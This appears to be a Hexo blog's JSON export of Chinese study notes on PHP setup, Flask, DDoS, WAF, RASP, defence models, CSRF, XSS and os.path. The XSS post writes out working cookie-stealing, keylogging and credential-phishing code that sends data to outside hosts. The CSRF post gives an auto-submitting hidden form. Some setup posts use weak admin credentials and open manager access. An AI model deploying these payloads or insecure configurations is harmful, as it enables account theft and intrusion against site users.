{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2018-06-09T12:41:47.797Z","updated":"2018-06-09T12:41:47.797Z","comments":false,"path":"/404.html","permalink":"http://yoursite.com//404.html","excerpt":"","text":""},{"title":"关于","date":"2018-06-09T13:03:03.699Z","updated":"2018-06-09T13:03:03.699Z","comments":false,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"个人详细介绍 打工是不可能去打工的。"},{"title":"分类","date":"2018-06-09T12:41:47.799Z","updated":"2018-06-09T12:41:47.799Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2018-06-09T12:41:47.798Z","updated":"2018-06-09T12:41:47.798Z","comments":false,"path":"books/index.html","permalink":"http://yoursite.com/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-06-09T13:02:37.610Z","updated":"2018-06-09T13:02:37.610Z","comments":true,"path":"links/index.html","permalink":"http://yoursite.com/links/index.html","excerpt":"","text":"google"},{"title":"Repositories","date":"2018-06-09T12:41:47.799Z","updated":"2018-06-09T12:41:47.799Z","comments":false,"path":"repository/index.html","permalink":"http://yoursite.com/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2018-06-09T13:05:43.876Z","updated":"2018-06-09T13:05:43.876Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"熟练各种编程语言的读法 擅长多门语言从入门到放弃 晚睡晚起打游戏 不喜欢回答问题"}],"posts":[{"title":"在ubuntu18下配置php开发环境","slug":"在ubuntu18下配置php开发环境","date":"2018-06-20T11:30:22.000Z","updated":"2018-06-20T11:30:52.845Z","comments":true,"path":"2018/06/20/在ubuntu18下配置php开发环境/","link":"","permalink":"http://yoursite.com/2018/06/20/在ubuntu18下配置php开发环境/","excerpt":"","text":"更新源 1234567891011121314sudo gedit /etc/apt/source.listdeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversesudo apt-get update -y 安装apache 123sudo apt install apache2service apache2 statusservice apache2 restrat 安装php7 12sudo apt install php7.0php -v 安装mysql5.7 12345678910111213141516171819202122232425sudo apt install mysql-server # 更改密码sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf---加上...skip-grant-tables ...-----sudo service mysql restart mysql -u rootuse msyql;UPDATE user set plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos;;update user set authentication_string = password(&apos;qwe123&apos;), password_expired = &apos;N&apos;, password_last_changed = now() where user = &apos;root&apos;;flush privileges;select user, host, plugin from user where user=&apos;root&apos;;# 改回来配置+重启mysql -u root -p qwe123 安装php-admin 12345sudo apt-get install phpmyadmin php-mbstring php-gettext，安装的过程中选择apache2。sudo phpenmod mcryptsudo phpenmod mbstring修改完成之后sudo systemctl restart apache2重启apache2服务器。 测试 123打开浏览器http://localhost/phpmyadmin Reference https://segmentfault.com/a/1190000005786808 https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"},{"name":"php","slug":"linux/php","permalink":"http://yoursite.com/categories/linux/php/"}],"tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"Flask08 - unittest","slug":"Flask08-unittest","date":"2018-06-18T16:08:54.000Z","updated":"2018-06-18T16:19:48.740Z","comments":true,"path":"2018/06/19/Flask08-unittest/","link":"","permalink":"http://yoursite.com/2018/06/19/Flask08-unittest/","excerpt":"","text":"概述 不可缺少的单元测试！ 使用unittest框架测试web应用的功能 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#-*- coding:utf-8 -*-from datetime import datetime,timedeltaimport unittestfrom microblogapp import app,dbfrom microblogapp.models import User,Postclass UserModelClass(unittest.TestCase): def setUp(self): db.create_all() def tearDown(self): db.session.remove() db.drop_all() def test_password(self): u = User(username=&apos;johnw&apos;) hash1 = u.set_password_hash(&apos;cat&apos;) self.assertTrue(u.check_password_hash(&apos;cat&apos;)) self.assertFalse(u.check_password_hash(&apos;dog&apos;)) def test_follow(self): u1 = User(username=&apos;susan&apos;) u2 = User(username=&apos;chris&apos;) db.session.add(u1) db.session.add(u2) u1.follow(u2) db.session.commit() self.assertTrue(u1.is_following(u2)) self.assertEqual(u1.followed.count(),1) self.assertEqual(u2.followers.count(),1) self.assertEqual(u1.followed.first().username,&apos;chris&apos;) self.assertEqual(u2.followers.first().username,&apos;susan&apos;) def test_follow_post(self): u1 = User(username=&apos;john&apos;) u2 = User(username=&apos;susan&apos;) u3 = User(username=&apos;jack&apos;) u4 = User(username=&apos;chris&apos;) now = datetime.now() p1 = Post(body=&apos;Post from john&apos;,author=u1,timestamp=now+timedelta(seconds=1)) p2 = Post(body=&apos;Post from susan&apos;,author=u2,timestamp=now+timedelta(seconds=4)) p3 = Post(body=&apos;Post from jack&apos;,author=u3,timestamp=now+timedelta(seconds=2)) p4 = Post(body=&quot;Post from chris&quot;,author=u4,timestamp=now+timedelta(seconds=3)) db.session.add_all([u1,u2,u3,u4]) db.session.add_all([p1,p2,p3,p4]) u1.follow(u2) # john follow susan u1.follow(u4) # john follow chris u2.follow(u3) # susan follow jack u3.follow(u4) # jack follow chris db.session.commit() f1 = u1.followed_posts().all() f2 = u2.followed_posts().all() f3 = u3.followed_posts().all() f4 = u4.followed_posts().all() self.assertEqual(f1,[p2,p4,p1]) self.assertEqual(f2,[p2,p3]) self.assertEqual(f3,[p4,p3]) self.assertEqual(f4,[p4])if &quot;__main__&quot; == __name__: unittest.main(verbosity=2)","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"flask","slug":"python/flask","permalink":"http://yoursite.com/categories/python/flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://yoursite.com/tags/Flask/"}]},{"title":"Flask07 - 数据库多对多关系","slug":"Flask07-数据库多对多关系","date":"2018-06-18T16:08:05.000Z","updated":"2018-06-18T16:19:55.338Z","comments":true,"path":"2018/06/19/Flask07-数据库多对多关系/","link":"","permalink":"http://yoursite.com/2018/06/19/Flask07-数据库多对多关系/","excerpt":"","text":"概述 简述如何实现关注与被关注的业务逻辑。涉及到数据库多对多的关系 数据库关系 一对多的关系 12345678910111213class userclass post一个user可以写多篇的post，但是一个post只能由一个user写出来所以，class post 存储 user_iduser_id = db.Column(db.Integer,db.ForeignKey('user.id'))----------class User 存储 relationshipposts = db.relationship('Post',backref='author',lazy='dynamic') 多对多的关系 12345678910111213141516171819202122232425262728293031323334353637383940假设有两个表： 老师 - 学生一个学生有多个老师一个老师有多个学生需要第三个辅助表：student_teacher:student_idteacher_id对于follower 和 followed 针对的都是 User 这个类1. 首先建立一个辅助表followers = db.table( # 关注了哪些user db.Column('follower_id',db.Integer,db.ForeignKey('user.id')), # 被哪些user关注 db.Column('followed_id',db.Integer,db.ForeignKey('user.id')))2. 开始在模型中建立关系 # 关注了哪些偶像followed = db.relationship('User',secondary=followers, # 这个人的id，也就是追随者的id primaryjoin=(followers.c.follower_id == id), # 这个是偶像的id，也是被追随者的id secondaryjoin=(followers.c.followed_id == id), backref=db.backref('followers',lazy='dynamic'),lazy='dynamic') # 这个时候如何创造模型：1. 把这个class user当成一个主动的人。就是这个关系呢，你要去关注别人，那最好的方式就是有几个动词：follow 关注别人unfollow 不关注别人following 是否正在关注别人所以这个followed==》返回的是已经关注的人的列表。偶像的列表这个relationship是个动词，这个类是主语。 文章用于解释的例子 user表 user id name 1 john 2 susan 3 marry 4 davin 关注 关注的人 被关注的人 1 (john) 2 (susan) 1 (john) 4 (davin) 2 (susan) 3 (marry) 3 (marry) 4 (davin) 文章 id(post) text user_id follower_id follwed_id 1 text from susan 2 1 (john) 2 2 text from marry 3 2 (susan) 3 3 text from davin 4 1 (john) 4 4 text from davin 4 3 (marry) 4 12345678我们可以看到对于这篇文章来说：follower_id 是追随者的idfollwed_id 是这篇文章被用于追随的id，也就是user id所以我们可以使用Post.query.filter(followers.c.followed==Post.user_id)来找出那些有被关注的文章，然后使用 follower_id 来筛选哪些文章要被展示 union的使用 12345678# 在时间线中展示自己的文章# 检索文章def followed_posts(self): # 联合查询。首先查出这个文章的作者id是已经关注的，接着查询关注者id是否为本人，最后按时间降序排序 followed = Post.query.join(followers,(followers.c.followed_id == Post.user_id)).filter(followers.c.follower_id == self.id) own = Post.query.filter_by(user_id=self.id) return followed.union(own).order_by(Post.timestamp.desc()) 将功能集成到application中 1234567891011121314151617181920212223# 路由@app.route(&apos;/follow/&lt;username&gt;&apos;)@login_requireddef follow(username): user = User.query.filter_by(username=username).first() if user is None: flash(&apos;User &quot;&#123;&#125;&quot; is not found&apos;.format(username)) return redirect(url_for(&apos;index&apos;)) if user == current_user: flash(&apos;You can follow yourself.&apos;) return redirect(url_for(&apos;index&apos;)) current_user.follow(user) flash(&apos;You are following &#123;&#125;&apos;.format(username)) db.session.commit() return redirect(url_for(&apos;user&apos;,username=username))# templates == user.html&lt;p&gt;&#123;&#123; user.follows.count() &#125;&#125; followers, &#123;&#123; user.followed.count() &#125;&#125; following&lt;/p&gt;&lt;a href=&quot;&#123;&#123;url_for(&apos;follow&apos;,username=user.username)&#125;&#125;&quot;&gt;follow&lt;/a&gt;&lt;a href=&quot;&#123;&#123;url_for(&apos;unfollow&apos;,username=user.username)&#125;&#125;&quot;&gt;unfollow&lt;/a&gt;","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"flask","slug":"python/flask","permalink":"http://yoursite.com/categories/python/flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://yoursite.com/tags/Flask/"}]},{"title":"4-DDoS了解","slug":"4-DDoS了解","date":"2018-06-18T12:19:53.000Z","updated":"2018-06-18T14:41:21.629Z","comments":true,"path":"2018/06/18/4-DDoS了解/","link":"","permalink":"http://yoursite.com/2018/06/18/4-DDoS了解/","excerpt":"","text":"概述 DDoS攻击分为流量型攻击和CC攻击，流量攻击主要是发送报文侵占正常业务的带宽，阻塞整个数据中心的出口，导致正常用户的访问无法到达。 CC攻击 主要针对某些业务频繁访问，激发大量消耗资源的数据库查询，文件IO，导致业务服务器CPU，或者IO出现瓶颈，无法提供正常的服务。 案例 TCP SYN FLOOD 一个正常的TCP需要三次握手，如下所示： 123客户端 --发送TCP SYN数据包--&gt;服务器分配控制块--返回SYN ACK数据包--&gt; 客户端 --返回 SYN ACK数据包--&gt; 服务器端--&gt; 服务器释放控制块如果客户端不返回SYN ACK数据包，或者不存在，那么就会造成TCP SYN 泛洪攻击 UDP FLOOD攻击 UDP 是没有连接状态的协议，因此可以发送大量的UDP请求，干扰正常应用。 反射型攻击 黑客伪造IP，向网络上大量开放特定服务的服务器进行请求，从而造成被伪造IP地址的服务器形成了DDoS攻击 解决方案 1, 流量清洗 2，流量压制","categories":[{"name":"security","slug":"security","permalink":"http://yoursite.com/categories/security/"},{"name":"企业安全建设","slug":"security/企业安全建设","permalink":"http://yoursite.com/categories/security/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"5-RASP安装","slug":"5-RASP安装","date":"2018-06-18T12:19:39.000Z","updated":"2018-06-18T14:41:17.744Z","comments":true,"path":"2018/06/18/5-RASP安装/","link":"","permalink":"http://yoursite.com/2018/06/18/5-RASP安装/","excerpt":"","text":"概述 RASP, 一种已探针的形式，将保护引擎注入到应用服务中，可在文件，数据库，网络等多个方面，对应用进行保护，当发生敏感的行为时，可以结合上下文的请求进行判断，阻断攻击，具有低误报率，低漏报率的优点 安装 这里使用的是百度开源的OpenRASP进行实验。下面是实验步骤 安装tomcat服务器 123456789101112131415161718192021222324yum install java -y下载tomcathttps://tomcat.apache.org/download-80.cgi配置manager页面vim conf/tomcat-users.xml&lt;role rolename=&quot;admin&quot;/&gt;&lt;role rolename=&quot;admin-gui&quot;/&gt;&lt;role rolename=&quot;admin-script&quot;/&gt;&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;role rolename=&quot;manager-script&quot;/&gt;&lt;role rolename=&quot;manager-jmx&quot;/&gt;&lt;role rolename=&quot;manager-status&quot;/&gt;&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;admin,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&quot;/&gt;添加远程访问vim conf/Catalina/localhost/manager.xml:&lt;Context privileged=&quot;true&quot; antiResourceLocking=&quot;false&quot; docBase=&quot;$&#123;catalina.home&#125;/webapps/manager&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;^.*$&quot; /&gt;&lt;/Context&gt; 下载漏洞程序 123456789https://sourceforge.net/projects/wavsep/进入tomcat的manager.html页面进行deploy(因为需要数据库，这里需要安装mysql。)然后打开http://192.168.31.39:8080/wavsep/wavsep-install/install.jsp 安装结束 安装openRASP 1java -jar RaspInstall.jar -install &lt;tomcat_root&gt; restart tomcat 总结 进行了漏洞测试，发现规则支持还不够强大，需要自己写一些规则，定制性高。","categories":[{"name":"security","slug":"security","permalink":"http://yoursite.com/categories/security/"},{"name":"企业安全建设","slug":"security/企业安全建设","permalink":"http://yoursite.com/categories/security/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"3-搭建WAF环境","slug":"3-搭建WAF环境","date":"2018-06-18T12:19:26.000Z","updated":"2018-06-18T12:21:36.224Z","comments":true,"path":"2018/06/18/3-搭建WAF环境/","link":"","permalink":"http://yoursite.com/2018/06/18/3-搭建WAF环境/","excerpt":"","text":"概述 针对HTTP/HTTPS的安全策略为web应用提供保护的产品，承担了sql注入，xss，远程命令执行，目录遍历等攻击的抵抗，是守护安全的第一道防线 优点 使用，配置简单方便 能够抵抗常见的扫描和常见的漏洞测探 缺点 防护能力不足以对抗黑产，依赖规则，针对未知攻击无应对方法，容易绕过 无法承担基础业务安全能力，比如褥羊毛行为，刷短信接口等 审计能力不足，出现事故无法提取较为详细的事件log记录等等 配置一个简单的WAF OpenResty 基于nginx与lua的高性能web平台，内部集成了大量精良的nginx模块，用于方便的搭建超高并发和拓展性极高的web应用，web服务和动态网管 123456789101112131415161718192021222324252627282930# 安装Debian 和 Ubuntu 用户推荐您使用 apt-get安装以下的开发库:apt-get install libpcre3-dev \\ libssl-dev perl make build-essential curlFedora 和 RedHat 用户推荐您使用yum安装以下的开发库:yum install pcre-devel openssl-devel gcc curl./configure然后在进入 openresty-VERSION/ 目录, 然后输入以下命令配置:./configure默认, --prefix=/usr/local/openresty 程序会被安装到/usr/local/openresty目录。您可以指定各种选项，比如./configure --prefix=/opt/openresty \\ --with-luajit \\ --without-http_redis2_module \\ --with-http_iconv_module \\ --with-http_postgres_module make或者make -j2 （双核编译）sudo make install waf https://github.com/unixhot/waf.git 配置反向代理 12345678910111213141516171819202122232425262728# openrestyhttp&#123; ... lua_shared_dict limit 50m; lua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.lua&quot;; init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;; access_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/access.lua&quot;;&#125;include &quot;/usr/local/openresty/nginx/conf/www.testwaf.com.conf&quot;;./nginx -s reload# www.testwaf.com.confupstream testwaf&#123; server 192.168.1.12:80;&#125;server &#123; listen 80; server_name www.testwaf.com; location / &#123; proxy_pass: http://testwaf; index index.html index.htm; &#125;&#125;# 最好使用root权限安装 总结 重点还是学习waf是怎么写的，后面在仔细研究下源码。 Reference https://openresty.org/cn/ https://openresty.org/cn/installation.html","categories":[{"name":"security","slug":"security","permalink":"http://yoursite.com/categories/security/"},{"name":"企业安全建设","slug":"security/企业安全建设","permalink":"http://yoursite.com/categories/security/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"2-常见防御体系","slug":"2-常见防御体系","date":"2018-06-18T12:19:01.000Z","updated":"2018-06-18T12:21:22.334Z","comments":true,"path":"2018/06/18/2-常见防御体系/","link":"","permalink":"http://yoursite.com/2018/06/18/2-常见防御体系/","excerpt":"","text":"名词解释 IDS： IDS是英文“Intrusion Detection Systems”的缩写，中文意思是“入侵检测系统”。 专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视， 尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。 做一个形象的比喻： 假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。 IPS 入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。 入侵防御系统(Intrusion-prevention system)是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。 UTM UTM是对传统防护手段的整合和升华，是建立在原有安全网关设备基础之上的，拥有防火墙、入侵防御(IPS)、防病毒(AV)、VPN、内容过滤、反垃圾邮件等多种功能，这些技术处理方式仍然是UTM的基础，但这些处理方式不再各自为战，需要在统一的安全策略下相互配合，协同工作。 对于众多的功能，有必备功能和增值功能之分。一般而言，防火墙、VPN、入侵防御、防病毒是必备的功能模块，缺少任何一个不能称之为UTM。其余是增值功能，用户可以根据自身需求进行选择。 web威胁感知 识别Web应用攻击，能够深度挖掘黑客针对Web的拖库、远程命令执行、敏感文件泄露、Webshell后门等攻击事件并发出准确的报警 常见的防御体系 边界防护 123456789101112&quot;在网络边界解决问题，强调御敌于国门之外&quot;主要措施：a. WAFb. 内外网隔离优点：部署简单缺点：内网突破后，黑客就控制了一切。 纵深防御体系 12345678910111213&quot;纵深防御本质为多层防御，增加攻击成本。&quot;纵深防御分为四部分：a. 网络边界：WAF，防火墙，IPS，UTM，流量清洗设备等等b. 网络层：IDS，web威胁感知，web审计c. 服务器端：主机IDS，服务器杀毒，内核假哭，主机WAF等d. 数据库：数据库审计，数据库防火墙等优点：防护的定位清晰，攻击成本提高，安全性提高缺点：各个部分缺乏协同性，检测手段多基于黑名单和规则，对于专业的黑客而言，也是可以突破的。 河防体系 在隔离的基础上，严格控制办公网络对生产网络的访问，同时在生产网络的内部进行隔离的基础上，进行边界防护和检测。适用于数据中心用户 塔防体系 纵深防御的一种，加上了云的管控能力和威胁情报数据。 参考 https://anquan.baidu.com/pages/threat.html https://searchsecurity.techtarget.com.cn/11-17666/ https://baike.baidu.com/item/IPS/2131631 https://zh.wikipedia.org/wiki/入侵检测系统 https://baike.baidu.com/item/IDS/22042","categories":[{"name":"security","slug":"security","permalink":"http://yoursite.com/categories/security/"},{"name":"企业安全建设","slug":"security/企业安全建设","permalink":"http://yoursite.com/categories/security/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"1-企业安全建设入门","slug":"1-企业安全建设入门","date":"2018-06-18T12:18:46.000Z","updated":"2018-06-18T12:21:09.606Z","comments":true,"path":"2018/06/18/1-企业安全建设入门/","link":"","permalink":"http://yoursite.com/2018/06/18/1-企业安全建设入门/","excerpt":"","text":"两个概念 PDR： 12345678protection（保护）：加密，认证，访问控制，防火墙，杀毒软件等等detection（检测）：入侵检测，漏洞扫描等response（应急响应）：建立应急响应机制，形成对安全的及时响应能力等 P2DR 12345678910protectionDetectionResponsePolice建立在PDR的基础上，多了一个Police（根据风险分析产生的安全策略），其中Police是模型的核心。着重于描述：系统中哪些资源需要保护？如何实现对它们的保护？","categories":[{"name":"security","slug":"security","permalink":"http://yoursite.com/categories/security/"},{"name":"企业安全建设","slug":"security/企业安全建设","permalink":"http://yoursite.com/categories/security/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"CSRF攻击学习","slug":"CSRF攻击学习","date":"2018-06-14T15:26:27.000Z","updated":"2018-06-18T12:18:00.625Z","comments":true,"path":"2018/06/14/CSRF攻击学习/","link":"","permalink":"http://yoursite.com/2018/06/14/CSRF攻击学习/","excerpt":"","text":"概述 一图胜千言 攻击方式 GET方式 假如现在有一个链接： https://csrf.com/m?addUser=id12345 那么我们就可以构造一个图片 1&lt;img src=&apos;https://csrf.com/m?addUser=id12345&apos;&gt; 只要你访问我的网站，那么就会触发这个链接，从而关注了我 POST方式 POST的请求经常伴随着跳转，一跳转，就会暴露，这个时候我们就要考虑加一个iframe。 但是在csrf测试的页面加iframe，根据同源政策，显示不来内容。于是我们新建另一个页面，加上iframe，连接到csrf的测试页面。如下： 新建一个iframe 123456&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;iframe style=&quot;display:block&quot; src=&apos;test.html&apos;&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 在建一个test.html 123456789101112131415&lt;!DOCTYPE HTML&gt;&lt;html lang=\"en-US\"&gt;&lt;head&gt;&lt;title&gt;CSRF GET&lt;/title&gt;&lt;body&gt; &lt;form name=\"form1\" action=\"http://127.0.0.1:5000/csrf\" method=\"post\"&gt; &lt;input type='hidden' name='username' value=\"csrf_ee1\"&gt; &lt;input type=\"hidden\" name=\"password\" value=\"qwe1231\"/&gt; &lt;input type=\"submit\" value&gt; &lt;/form&gt; &lt;script&gt; document.forms.form1.submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这样一来，成功复现了csrf 什么叫做XSRF？ XSRF指的是xss+csrf的攻击，指的是一个网站既有xss又有csrf。 这样一来就可以进行两者的结合，通过xss注入csrf的html代码。 通过js生成代码 123456&lt;script&gt; var iframe = document.createElement('iframe'); iframe.style.display = 'none'; iframe.src='test.html'; document.body.appendChild(iframe);&lt;/script&gt; 总结 csrf总的来说，主要聚焦于写，并不会窃取用户的数据。","categories":[{"name":"security","slug":"security","permalink":"http://yoursite.com/categories/security/"},{"name":"CSRF","slug":"security/CSRF","permalink":"http://yoursite.com/categories/security/CSRF/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"CSRF","slug":"CSRF","permalink":"http://yoursite.com/tags/CSRF/"}]},{"title":"xss攻击学习","slug":"xss攻击学习","date":"2018-06-14T15:12:45.000Z","updated":"2018-06-14T15:27:06.713Z","comments":true,"path":"2018/06/14/xss攻击学习/","link":"","permalink":"http://yoursite.com/2018/06/14/xss攻击学习/","excerpt":"","text":"概念 xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用户造成影响的html/js代码，从而窃取用户信息，进行病毒侵害等行为。 类型 反射型 将用户输入的数据通过url的形式直接或未经完善过滤就在浏览器中输出，导致浏览器执行了用户输入的代码数据 存储型 程序将用户输入的数据信息保存在了服务器端（如数据库），网页在查询数据时候，从中获取了畸形数据内容，在网页进行展示。造成xss DOM型 反射型xss的一种，不同点在于，注入的方式是根据js的DOM进行分析并注入,较为少见。 攻击 盗取cookies 简单的： 12345678910#jsDocument.location=&apos;https://www.xsser.me/cookies.php?cookie=&apos;+document.cookie;#php&lt;?php$cookie = $_GET[&apos;cookie&apos;];$log = fopen(&quot;cookies.txt&quot;,&quot;a&quot;);Fwrite($log,$cookie.&quot;&quot;\\n&quot;)Fclose($log)?&gt; 复杂的： 12345678910111213141516171819202122232425262728293031(function() &#123; (new Image()).src = &apos;http://xsser.me/index.php?do=api&amp;id=RAMWD1&amp;location=&apos; + escape((function() &#123; try &#123; return document.location.href &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;toplocation=&apos; + escape((function() &#123; try &#123; return top.location.href &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;cookie=&apos; + escape((function() &#123; try &#123; return document.cookie &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;opener=&apos; + escape((function() &#123; try &#123; return (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href : &apos;&apos; &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)());&#125;)();if (&apos;&apos; == 1) &#123; keep = new Image(); keep.src = &apos;http://xsser.me/index.php?do=keepsession&amp;id=RAMWD1&amp;url=&apos; + escape(document.location) + &apos;&amp;cookie=&apos; + escape(document.cookie)&#125;; 读取用户键盘输入 123456789101112131415161718192021222324252627#!js$(document).ready(function()&#123; var server = &quot;http://server.com/&quot;; //接收服务器 var gate = &quot;data.php?data=&quot;; //接收文件 var tabURL = window.location.href; var keys=&apos;&apos;; document.onkeypress = function(e) &#123; get = window.event?event:e; key = get.keyCode?get.keyCode:get.charCode; key = String.fromCharCode(key); keys+=key; &#125; window.setInterval(function()&#123; new Image().src = server+gate+keys; keys = &apos;&apos;; &#125;, 1000); &#125;);#!php&lt;?php$txt = $_GET[&apos;data&apos;];$log = fopen(&quot;keylog.txt&quot;, &quot;a&quot;) or die(&quot;Unable to open file!&quot;);fwrite($log, $txt);fclose($log);?&gt; 网络钓鱼攻击 123456789101112131415161718192021222324252627282930# html&lt;html&gt; &lt;body&gt; &lt;script src=&quot;http://192.168.31.63/authtest.php?id=RAMWD1&amp;info=age%2Cmonth&quot;&gt; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;#php&lt;?error_reporting(0);if ((!isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) || (!isset($_SERVER[&apos;PHP_AUTH_PW&apos;]))) &#123; header(&apos;WWW-Authenticate: Basic realm=&quot;&apos;.addslashes(trim($_GET[&apos;info&apos;])).&apos;&quot;&apos;); header(&apos;HTTP/1.0 401 Unauthorized&apos;); echo &apos;Authorization Required.&apos;; exit;&#125; else if ((isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) &amp;&amp; (isset($_SERVER[&apos;PHP_AUTH_PW&apos;])))&#123; header(&quot;Location: http://192.168.31.63/index.php?do=api&amp;id=&#123;$_GET[id]&#125;&amp;username=&#123;$_SERVER[PHP_AUTH_USER]&#125;&amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;&quot;); &#125;?&gt; Beef框架 BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. xss蠕虫 其实是CSRF和xss的结合。利用XHR，另找时间研究学习一下。 强制软件下载 12345678910111213#!php$(document).ready(function()&#123; var server = &quot;http://server.com/&quot;; //服务器 var gate = &quot;/test/test.exe&quot;; //要下载的文件 var tabURL = window.location.href; var link = document.createElement(&apos;a&apos;); link.href = server+gate; link.download = &apos;&apos;; document.body.appendChild(link); link.click(); &#125;);","categories":[{"name":"security","slug":"security","permalink":"http://yoursite.com/categories/security/"},{"name":"xss","slug":"security/xss","permalink":"http://yoursite.com/categories/security/xss/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-os.path","slug":"python模块-os-path","date":"2018-06-14T14:02:49.000Z","updated":"2018-06-18T16:19:36.053Z","comments":true,"path":"2018/06/14/python模块-os-path/","link":"","permalink":"http://yoursite.com/2018/06/14/python模块-os-path/","excerpt":"","text":"概述 涉及到文件和文件夹的操作的一般有三个模块 os os.path shutil os.path os.path 模块，顾名思义就是针对于系统的文件路径啊，判断是否为文件啊等等行为做出处理的模块。 os.path.abspath(path) 返回当前绝对路径+path参数的字符 123456&gt;&gt;&gt; os.path.abspath(&apos;.&apos;)&apos;/Users/xxxx&apos;&gt;&gt;&gt; os.path.abspath(&apos;~&apos;)&apos;/Users/xxxx/~&apos;&gt;&gt;&gt; os.path.abspath(&apos;logs&apos;)&apos;/Users/xxxx/logs&apos; os.path.basename(path) 返回路径下面的文件名的字符串。(这个文件路径可能不存在) 12&gt;&gt;&gt; os.path.basename(&apos;/user/johnw/test.txt&apos;)# &apos;test.txt&apos; os.path.commonpath([path1,path2]) 接受一个序列，得到两个字符串中相同的文件路径（一定要是路径字符串） 12&gt;&gt;&gt; os.path.commonpath([&apos;/user/johnw/log.txt&apos;,&apos;/user/johnw/logs/test.txt&apos;])&apos;/user/johnw&apos; os.path.commonprefix([path1,path2]) 顾名思义，接受路径字符的序列，比较前缀 12345&gt;&gt;&gt; os.path.commonprefix([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])&apos;/usr/l&apos;&gt;&gt;&gt; 